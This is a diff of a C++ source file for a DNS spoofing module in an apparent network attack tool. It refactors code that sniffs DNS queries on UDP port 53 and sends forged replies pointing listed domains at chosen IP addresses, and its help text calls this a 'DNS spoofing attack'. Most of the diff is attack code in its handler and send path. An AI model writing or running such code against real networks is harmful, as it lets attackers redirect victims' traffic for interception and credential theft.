@@ -1,25 +1,9 @@
 #include "DnsSpoof.hh"
 
-DnsSpoof::DnsSpoof(Core &core, std::ostream *out, const std::string &file, const std::string &interface)
-    : AModule(core, "DnsSpoof", out), _file(file), _sniffer(interface, Sniffer::PROMISC)
+DnsSpoof::DnsSpoof(const NetworkInterface &iface, std::ostream *out, const std::string &file)
+    : ASniffer(iface, "DnsSpoof", "udp and dst port 53", out)
 {
     readHosts(file);
-}
-
-void DnsSpoof::start(void)
-{
-    // Only capture udp packets sent to port 53
-    _sniffer.set_filter("udp and dst port 53");
-
-    // Start the capture
-    std::thread     t(&DnsSpoof::sniff, this);
-
-    t.detach();
-}
-
-void DnsSpoof::sniff(void)
-{
-    _sniffer.sniff_loop(make_sniffer_handler(this, &DnsSpoof::spoofQuery));
 }
 
 void DnsSpoof::readHosts(const std::string &file)
@@ -31,14 +15,9 @@ void DnsSpoof::readHosts(const std::string &file)
         _spoofedHosts[host] = ip;
 }
 
-void DnsSpoof::stop(void)
+std::string DnsSpoof::info(void) const
 {
-    _sniffer.stop_sniff();
-}
-
-std::string DnsSpoof::info(void)
-{
-    return "Host file used : " + _file;
+    return "Hostfile = " + _file;
 }
 
 std::string DnsSpoof::help(void)
@@ -47,12 +26,12 @@ std::string DnsSpoof::help(void)
 
     rep += "Start DNS spoofing attack for domains in file.\n";
     rep += "Host file must have the form : ip_adress domain\n";
-    rep += "\tOptions : <file>";
+    rep += "\tOptions : <hostfile>";
 
     return rep;
 }
 
-bool DnsSpoof::spoofQuery(PDU &pdu)
+bool DnsSpoof::handler(PDU &pdu)
 {
     // EthernetII / IP / UDP / RawPDU
     EthernetII eth = pdu.rfind_pdu<EthernetII>();
@@ -90,7 +69,7 @@ bool DnsSpoof::spoofQuery(PDU &pdu)
                                 UDP(udp.sport(), udp.dport()) /
                                 dns;
             // Send it!
-            _core.send(pkt);
+            _sender.send(pkt, _iface);
         }
     }
     return true;
